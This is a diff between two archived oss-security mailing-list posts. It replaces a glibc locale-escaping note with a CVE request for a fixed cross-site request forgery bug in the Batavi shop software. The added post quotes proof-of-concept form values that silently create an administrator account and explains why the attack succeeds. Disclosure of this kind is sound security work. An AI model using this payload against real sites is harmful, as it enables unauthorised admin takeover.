@@ -1,28 +1,72 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/08/8
-Message-ID: <20110308120621.6ac54049@orphan>
-Date: Tue, 8 Mar 2011 12:06:21 +0100
-From: Tomas Hoger <thoger@...hat.com>
-To: OSS Security <oss-security@...ts.openwall.com>
-Subject: glibc locale escaping issue
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/25/14
+Message-ID: <C964EF34.473F6%ronald@a61.nl>
+Date: Tue, 25 Jan 2011 21:20:52 +0100
+From: Ronald van den Blink <ronald@....nl>
+To: <oss-security@...ts.openwall.com>
+Subject: Batavi 1.0 - XSRF bug fixed
 Content-Type: text/plain; charset=utf-8
 
-Hi!
+Hi,
 
-Following glibc upstream and gentoo bug reports describe a bug in the
-way locale command escapes its output.
+The open source project Batavi has just released their version 1.0 which has
+fixed a XSRF exploit which was part of at least their latest alpha release.
+Just a quick snippet:
 
-http://sources.redhat.com/bugzilla/show_bug.cgi?id=11904
-http://bugs.gentoo.org/show_bug.cgi?id=330923
+"is a specially prepared page containing a form with a couple of
+hidden form values.
 
-Gentoo bug points out possible security implications.  I've not managed
-to find an example where the locale command is used in a problematic way
-and where this may cross trust boundaries, so I wonder if this is worth
-handling as security fix vs. security enhancement.  Comments are
-welcome.
+$title = "Batavi";
+$uri = "http://$host/admin/index.php?administrators&page=1&action=save"; [^
+<http://$host/admin/index.php?administrators&page=1&action=save";> ]
+$method = "post";
 
-The issue was fixed in GLSA 201011-01, but its text really only
-mentions Tavis' issues.
+$values = array (
+'user_name' => "hacker",
+'user_password' => "b4t4v1",
+'first_name' => "Evil",
+'last_name' => "Hacker",
+'mail_address' => "evil.hacker@...mple.com",
+'configuration[MAX_DISPLAY_SEARCH_RESULTS]' => "20",
+'configuration[CATEGORY_PULL_DOWN_SHOW_PER_PAGE]' => "10, 20, 50, 100",
+'configuration[PRODUCTS_SHOW_PRODUCTS_COUNT]' => "2",
+'configuration[PRODUCTS_SHOW_PRODUCTS_INCLUDING_SUBCATEGORIES]' => "1",
+'configuration[ADMIN_DEFAULT_LANGUAGE]' => "1",
+'configuration[SETTING_TINY_MCE]' => "2",
+'configuration[ADMINISTRATOR_STATE]' => "1",
+'configuration[ADMINISTRATOR_PRODUCT_TO_CATEGORIES]' => "1",
+'modules[]' => "*",
+'subaction' => "confirm"
+);
 
--- 
-Tomas Hoger / Red Hat Security Response Team
+Of course these PHP values are converted to an HTML form, this array is
+just for my own convenience. I have an XSRF framework to be able to try
+and demonstrate this type of attack quickly and clearly.
+The HTML form is automatically submitted as soon as the page is loaded.
+If the user is visiting the specially prepared page when he is logged in
+as an administrator with sufficient permissions, his browser takes him
+to the URL the form is submitted to, in this case
+"http://batavi.cheatah.nl/$host/admin/index.php?administrators&page=1&action
+=save", 
+<http://batavi.cheatah.nl/$host/admin/index.php?administrators&page=1&action
+=save%22,>  [^ 
+<http://batavi.cheatah.nl/$host/admin/index.php?administrators&page=1&action
+=save%22,> ] 
+and the browser decides to send along his original session cookie. So
+for the application, everything seems in order. The user is logged in
+and providing his session data, the IP address is even that of the
+actual administrator. Only the HTTP_REFERER might be different, but that
+header cannot be trusted anyway, many client security software packages
+strip the Referrer header from HTTP requests, so often the header is
+nonexistent or blank. You can't block people with blank referrers, they
+might be legitimate users, making use of provacy protection software."
+
+As one of the people involved I know it's fixed now, but can we still
+receive a CVE for the versions before V0.9.3 beta?
+
+Thnx
+
+Ronald
+
+
+
